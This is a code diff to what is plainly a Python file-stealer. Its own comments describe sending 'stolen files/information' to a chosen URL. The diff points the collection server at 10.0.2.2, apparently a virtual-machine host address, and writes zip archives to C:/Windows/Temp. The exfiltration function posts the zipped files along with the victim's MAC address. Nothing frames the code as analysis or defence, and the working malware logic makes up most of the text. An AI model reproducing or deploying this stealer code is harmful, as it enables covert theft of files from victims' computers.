@@ -8,9 +8,9 @@ from contextlib import ExitStack # to close files properly
 from secrets import token_hex # to generate hashes to avoid file name conflicts
 from getmac import get_mac_address # to get mac address
 
-URL = 'http://127.0.0.1:8000' # the URL/IP to which you want to send the stolen files/information to
-ZIP_URL = 'http://127.0.0.1:8000/zip'
-AMOUNT_TO_SEND = 500.0 # How many files you want to send each time
+# URL = 'http://127.0.0.1:8000' # the URL/IP to which you want to send the stolen files/information to
+URL = 'http://10.0.2.2:8000'
+AMOUNT_TO_SEND = 500.0 # How many files you want to send each time NOTE: Can also make sending by every X mb, or every X mb or X files whichever comes first
 USERNAME = os.getlogin()
 MAC = get_mac_address().replace(':', '') # store mac address
 
@@ -36,7 +36,7 @@ def steal_zipped_files():
     zip_name = make_zip() # make the zip with all its files and save its name
     with open(zip_name, 'rb') as zip: # open the zip file in bytes so it can be sent properly
         zip_file = {'file':(zip_name, zip, 'application/zip')} # make the payload
-        r = requests.post(ZIP_URL, headers={'mac':MAC}, files=zip_file) # send the zip file
+        r = requests.post(f'{URL}/zip', headers={'mac':MAC}, files=zip_file) # send the zip file
         zip.close()
         if not 300 > r.status_code >= 200:
             pass
@@ -61,9 +61,16 @@ def steal_files(): # steal files (Non-zipped version, zipped version is default)
         del files_found[:count]
 
 def make_zip():
-    zip_name = f'{token_hex(64)}.zip' # give every zip a random name so you don't get errors due to a zip file being open when you're trying to delete it
+    zip_name = f'C:/Windows/Temp/{token_hex(64)}.zip' # give every zip a random name so you don't get errors due to a zip file being open when you're trying to delete it
     with ZipFile(zip_name, 'w') as zip: # open zip file
         for file in files_found:
+            # i = 0 # number next to file name in case there are more than one file with the same filename
+            # # file_name = file[0]
+            # if file_name in zip.namelist():
+            #     while file_name+f'(duplicate {i})' in zip.namelist():
+            #         i += 1
+            #     file_name += f'(duplicate {i})'
+            #     print(f'made duplicate {file_name}')
             zip.write(file[0], arcname=os.path.basename(file[0])) # put all the files in the zip
         zip.close()
     return zip_name
